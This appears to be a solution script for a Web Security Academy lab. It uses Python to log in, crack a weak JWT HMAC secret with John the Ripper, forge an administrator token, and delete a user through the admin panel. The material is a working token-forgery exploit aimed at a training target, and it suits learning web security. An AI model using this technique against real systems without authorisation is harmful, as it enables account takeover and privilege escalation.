'''
This lab uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a wordlist of common secrets.

To solve the lab, first brute-force the website's secret key. Once you've obtained this, use it to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 
'''

import base64
import json
import jwt
import requests
from bs4 import BeautifulSoup


proxies = {
    'http': '127.0.0.1:8080',
    'https': '127.0.0.1:8080'
}

url = "https://0a51005e03b38cc080e0673300bc00f9.web-security-academy.net"

s = requests.Session()
s.proxies.update(proxies)
s.verify = False

# login
r = s.get(f"{url}/login")
soup = BeautifulSoup(r.text)
csrf = soup.find('input', {'name':'csrf'})['value']

payload = {
    'csrf':csrf,
    'username':'wiener',
    'password':'peter'
}

s.post(f"{url}/login", data=payload)

# mutate jwt token
encoded_jwt = s.cookies.get_dict()['session']
encoded_jwt_split = encoded_jwt.split('.')

'''
Manual step:
- echo "<encoded_jwt>" > jwt.txt
- john jwt.txt --wordlist=encoded_jwt_split --format=HMAC-SHA256
    - HMAC secret: secret1
'''
secret = "secret1"

jwt_data = base64.b64decode(encoded_jwt_split[1] + '====')
jwt_data = json.loads(jwt_data.decode())
jwt_data['sub'] = 'administrator'

admin_jwt = jwt.encode(jwt_data, secret, algorithm="HS256")

# delete carlos
payload = {'username':'carlos'}
s.cookies.set('session', admin_jwt)
s.get(f"{url}/admin/delete", params=payload)